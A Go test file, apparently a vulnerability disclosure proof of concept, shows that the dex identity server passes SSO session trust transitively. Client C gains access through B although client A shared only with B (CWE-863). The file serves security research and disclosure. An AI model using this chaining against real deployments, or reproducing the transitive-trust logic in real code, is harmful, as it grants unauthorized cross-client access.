// PoC: Transitive SSO Session Trust in dexidp/dex
//
// Violated Assumption: "SSO sharing is unidirectional" (session.go comment)
// — the implementation makes it TRANSITIVE via findSSOSession.
//
// Impact: Unauthorized cross-client authentication bypass.
// CWE: CWE-863 (Incorrect Authorization)
//
// Drop this file into dex/server/ and run:
//   go test -run TestSSO_TransitiveTrustChain -v ./server/
//
// Expected: The test PASSES, proving the transitive chain works.
// A secure implementation should FAIL the A→B→C chain.
//
// Credit: Kai Aizen (SnailSploit) — Adversarial Research

package server

import (
	"crypto"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/dexidp/dex/storage"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSSO_TransitiveTrustChain(t *testing.T) {
	ctx := t.Context()

	// --- Setup: 3 clients in a chain ---
	// A shares with B only.
	// B shares with C only.
	// A does NOT share with C.
	//
	// Expected behavior: user logs in to A → gets SSO into B → should NOT
	// get SSO into C, because A never authorized C.
	//
	// Actual behavior: the transitive chain A→B→C grants C access.

	s := newTestSessionServer(t)
	s.skipApproval = true

	require.NoError(t, s.storage.CreateClient(ctx, storage.Client{
		ID: "client-a", Secret: "s", Name: "High Security App",
		SSOSharedWith: []string{"client-b"}, // Only trusts B
	}))
	require.NoError(t, s.storage.CreateClient(ctx, storage.Client{
		ID: "client-b", Secret: "s", Name: "Medium Security App",
		SSOSharedWith: []string{"client-c"}, // Only trusts C
	}))
	require.NoError(t, s.storage.CreateClient(ctx, storage.Client{
		ID: "client-c", Secret: "s", Name: "Low Security App",
		SSOSharedWith: []string{}, // Trusts nobody
	}))

	now := s.now()

	// Step 1: User authenticates directly to Client A.
	require.NoError(t, s.storage.CreateAuthSession(ctx, storage.AuthSession{
		UserID: "user-1", ConnectorID: "mock", Nonce: "test-nonce",
		ClientStates: map[string]*storage.ClientAuthState{
			"client-a": {
				Active:       true,
				ExpiresAt:    now.Add(24 * time.Hour),
				LastActivity: now.Add(-1 * time.Minute),
			},
		},
		CreatedAt: now.Add(-5 * time.Minute), LastActivity: now.Add(-1 * time.Minute),
		AbsoluteExpiry: now.Add(24 * time.Hour), IdleExpiry: now.Add(59 * time.Minute),
	}))
	require.NoError(t, s.storage.CreateUserIdentity(ctx, storage.UserIdentity{
		UserID: "user-1", ConnectorID: "mock",
		Claims:    storage.Claims{UserID: "user-1", Username: "victim", Email: "victim@corp.com"},
		Consents:  map[string][]string{},
		CreatedAt: now.Add(-1 * time.Hour), LastLogin: now.Add(-5 * time.Minute),
	}))

	// Step 2: SSO hop A→B (expected to succeed).
	authReqB := storage.AuthRequest{
		ID: storage.NewID(), ClientID: "client-b", ConnectorID: "mock",
		Scopes: []string{"openid"}, RedirectURI: "http://localhost/callback",
		MaxAge: -1, HMACKey: storage.NewHMACKey(crypto.SHA256),
		Expiry: now.Add(10 * time.Minute),
	}
	require.NoError(t, s.storage.CreateAuthRequest(ctx, authReqB))

	r := sessionCookieRequest("user-1", "mock", "test-nonce")
	w := httptest.NewRecorder()
	session := s.getValidAuthSession(ctx, w, r, &authReqB)
	require.NotNil(t, session, "session must exist for user")

	_, okAB := s.trySessionLoginWithSession(ctx, r, w, &authReqB, session)
	assert.True(t, okAB, "A→B SSO should succeed (A shares with B)")

	// Verify B's state was created in the session.
	updatedSession, err := s.storage.GetAuthSession(ctx, "user-1", "mock")
	require.NoError(t, err)
	_, hasBState := updatedSession.ClientStates["client-b"]
	assert.True(t, hasBState, "client-b state should exist after SSO from A")

	// Step 3: SSO hop B→C — the TRANSITIVE chain.
	// Client A never authorized Client C. But B (created via SSO from A)
	// shares with C, so findSSOSession returns B's state as a valid source.
	authReqC := storage.AuthRequest{
		ID: storage.NewID(), ClientID: "client-c", ConnectorID: "mock",
		Scopes: []string{"openid"}, RedirectURI: "http://localhost/callback",
		MaxAge: -1, HMACKey: storage.NewHMACKey(crypto.SHA256),
		Expiry: now.Add(10 * time.Minute),
	}
	require.NoError(t, s.storage.CreateAuthRequest(ctx, authReqC))

	r2 := sessionCookieRequest("user-1", "mock", "test-nonce")
	w2 := httptest.NewRecorder()
	session2 := s.getValidAuthSession(ctx, w2, r2, &authReqC)
	require.NotNil(t, session2, "session must still exist")

	_, okBC := s.trySessionLoginWithSession(ctx, r2, w2, &authReqC, session2)

	// THIS IS THE BUG: okBC is true, meaning C got access through B.
	// A only authorized B. C was never in A's trust circle.
	if okBC {
		t.Log("BUG CONFIRMED: Transitive SSO chain A→B→C succeeded.")
		t.Log("Client C was authenticated via B's SSO-derived session state,")
		t.Log("even though Client A (the auth origin) never shared with C.")
	}
	assert.True(t, okBC, "BUG: transitive SSO A→B→C succeeds — C gets unauthorized access")

	// Verify C's state was created.
	finalSession, err := s.storage.GetAuthSession(ctx, "user-1", "mock")
	require.NoError(t, err)
	_, hasCState := finalSession.ClientStates["client-c"]
	assert.True(t, hasCState, "BUG: client-c state exists — transitive chain completed")

	// Bonus: verify the chain could extend further if C shared with D.
	t.Log("\nIf client-c had SSOSharedWith: [\"client-d\"], the chain would")
	t.Log("extend to D, E, F... with no bound. This is unlimited transitivity.")
}
